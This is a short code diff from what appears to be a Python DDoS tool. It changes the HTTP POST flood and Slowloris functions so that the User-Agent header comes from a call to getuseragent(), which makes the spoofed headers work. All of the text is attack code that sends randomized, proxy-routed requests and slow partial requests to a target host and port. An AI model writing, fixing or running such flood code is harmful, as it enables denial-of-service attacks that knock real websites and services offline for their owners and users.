@@ -156,7 +156,7 @@ def post(socks_type):
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
-	user_agent = "User-Agent: " + getuseragent + "\r\n"
+	user_agent = "User-Agent: " + getuseragent() + "\r\n"
 	accept = random.choice(acceptall)
 	if mode2 != "y":
 		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
@@ -218,7 +218,7 @@ def slow(conn,socks_type):
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
 			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
-			s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
+			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 			if cookies != "":
 				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
